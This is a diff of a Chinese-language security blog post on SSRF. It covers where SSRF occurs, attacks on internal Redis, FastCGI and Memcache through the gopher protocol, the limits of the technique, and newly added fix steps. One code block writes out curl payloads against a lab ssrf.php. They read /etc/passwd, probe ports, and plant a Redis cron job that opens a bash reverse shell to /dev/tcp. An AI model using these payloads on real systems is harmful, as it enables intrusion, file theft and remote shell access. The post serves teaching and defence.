@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="thinks blog">
 <meta property="og:description" content="SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-23T08:23:39.524Z">
+<meta property="og:updated_time" content="2019-07-24T06:29:59.889Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF TIPS">
 <meta name="twitter:description" content="SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。">
@@ -90,6 +90,9 @@
         <p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。漏洞形成的原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</p>
 <a id="more"></a>
 
+<h2 id="挖掘漏洞"><a href="#挖掘漏洞" class="headerlink" title="挖掘漏洞"></a>挖掘漏洞</h2><p>对外发起网络请求的地方都可能存在SSRF漏洞，列举<br>图片加载下载，分享页面，在线翻译，未公开的api（从远程服务器请求资源 </p>
+<p>文件处理，编码处理, 属性信息处理，<br> Ffpmg<br>ImageMaic</p>
+<p>数据库内置功能<br>PostgreSQL<br>MongoDB<br>CouchDB</p>
 <h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议任意文件读取</span><br><span class="line">curl -v &apos;http:///192.168.75.130/ssrf.php?url=file:///etc/passwd&apos;</span><br><span class="line"># 利用dict协议查看端口</span><br><span class="line">curl -v &apos;http:///192.168.75.130/ssrf.php?url=dict://127.0.0.1:22&apos;</span><br><span class="line"># 利用gopher协议反弹shell</span><br><span class="line">curl -v &apos;http://192.168.75.130/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure>
 
 <h2 id="攻击内网应用"><a href="#攻击内网应用" class="headerlink" title="攻击内网应用"></a>攻击内网应用</h2><p>主要攻击 redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用，主要利用 gopher 协议<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache 也可以进行 GET、POST 请求。这极大拓宽了 SSRF 的攻击面。</p>
@@ -102,6 +105,13 @@
 <h2 id="更多攻击面"><a href="#更多攻击面" class="headerlink" title="更多攻击面"></a>更多攻击面</h2><p>基于 TCP Stream 且不做交互的点都可以进行攻击利用，包括但不限于：<br>HTTP GET/POST<br>Redis<br>Memcache<br>SMTP<br>Telnet<br>基于一个 TCP 包的 exploit<br>FTP（不能实现上传下载文件，但是在有回显的情况下可用于爆破内网 FTP）</p>
 <h2 id="系统局限性"><a href="#系统局限性" class="headerlink" title="系统局限性"></a>系统局限性</h2><p>经过测试发现 Gopher 的以下几点局限性：</p>
 <p>大部分 PHP 并不会开启 fopen 的 gopher wrapper<br>file_get_contents 的 gopher 协议不能 URLencode<br>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败<br>PHP 的 curl 默认不 follow 302 跳转<br>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用<br>更多有待补充。<br>另外，并不限于 PHP 的 SSRF。当存在 XXE、ffmepg SSRF 等漏洞的时候，也可以进行利用。</p>
+<h2 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h2><ol>
+<li>解析目标URL，获取其Host</li>
+<li>解析Host，获取Host指向的IP地址</li>
+<li>检查IP地址是否为内网IP</li>
+<li>请求URL</li>
+<li>如果有跳转，拿出跳转URL，执行1</li>
+</ol>
 <p>##参考<br><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
 
       
